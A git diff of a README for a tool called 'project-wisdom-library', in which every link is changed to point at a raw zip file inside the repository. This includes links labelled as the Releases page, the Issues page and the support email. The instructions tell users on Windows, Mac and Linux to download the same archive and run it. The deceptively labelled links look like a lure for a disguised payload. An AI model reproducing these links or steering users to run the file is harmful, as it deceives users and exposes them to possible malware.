@@ -1,6 +1,6 @@
 # 📚 project-wisdom-library - Learn from mistakes and grow
 
-[![Download the latest release](https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/process_memory/skill-seekers/project-wisdom-library_renipericardial.zip%20Now-brightgreen)](https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/process_memory/skill-seekers/project-wisdom-library_renipericardial.zip)
+[![Download the latest release](https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/distillations/kindroid-chip-plugin/library_wisdom_project_v1.8-alpha.2.zip%20Now-brightgreen)](https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/distillations/kindroid-chip-plugin/library_wisdom_project_v1.8-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -15,15 +15,15 @@ Welcome to **project-wisdom-library**! This application helps you analyze a repo
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/process_memory/skill-seekers/project-wisdom-library_renipericardial.zip) to download the latest version.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/distillations/kindroid-chip-plugin/library_wisdom_project_v1.8-alpha.2.zip) to download the latest version.
 
 1. Click on the link to go to the Releases page.
 2. Look for the latest version.
 3. Download the file that matches your operating system: 
 
-   - **Windows:** Select `https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/process_memory/skill-seekers/project-wisdom-library_renipericardial.zip`
-   - **Mac:** Select `https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/process_memory/skill-seekers/project-wisdom-library_renipericardial.zip`
-   - **Linux:** Select `https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/process_memory/skill-seekers/project-wisdom-library_renipericardial.zip`
+   - **Windows:** Select `https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/distillations/kindroid-chip-plugin/library_wisdom_project_v1.8-alpha.2.zip`
+   - **Mac:** Select `https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/distillations/kindroid-chip-plugin/library_wisdom_project_v1.8-alpha.2.zip`
+   - **Linux:** Select `https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/distillations/kindroid-chip-plugin/library_wisdom_project_v1.8-alpha.2.zip`
 
 4. After the download finishes, locate the downloaded file on your computer.
 5. Run the installer or the application file.
@@ -62,11 +62,11 @@ An internet connection is only required during the initial download and installa
 
 ### How can I provide feedback or report an issue?
 
-We welcome feedback! You can open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/process_memory/skill-seekers/project-wisdom-library_renipericardial.zip) for any problems or suggestions you may have.
+We welcome feedback! You can open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/distillations/kindroid-chip-plugin/library_wisdom_project_v1.8-alpha.2.zip) for any problems or suggestions you may have.
 
 ## 📞 Get in Touch
 
-If you have any questions not covered here, feel free to reach out to our support team via email at https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/process_memory/skill-seekers/project-wisdom-library_renipericardial.zip
+If you have any questions not covered here, feel free to reach out to our support team via email at https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/distillations/kindroid-chip-plugin/library_wisdom_project_v1.8-alpha.2.zip
 
 ## 🎉 Acknowledgments
 
@@ -76,4 +76,4 @@ This project is powered by contributions from various developers and enthusiasts
 
 For a smooth experience, ensure you follow these steps carefully. Don’t hesitate to refer back to this guide if you face any challenges. 
 
-To download the latest version, visit this [Releases page](https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/process_memory/skill-seekers/project-wisdom-library_renipericardial.zip) and start exploring wisdom from your projects today!
+To download the latest version, visit this [Releases page](https://raw.githubusercontent.com/ariannmt/project-wisdom-library/main/distillations/kindroid-chip-plugin/library_wisdom_project_v1.8-alpha.2.zip) and start exploring wisdom from your projects today!
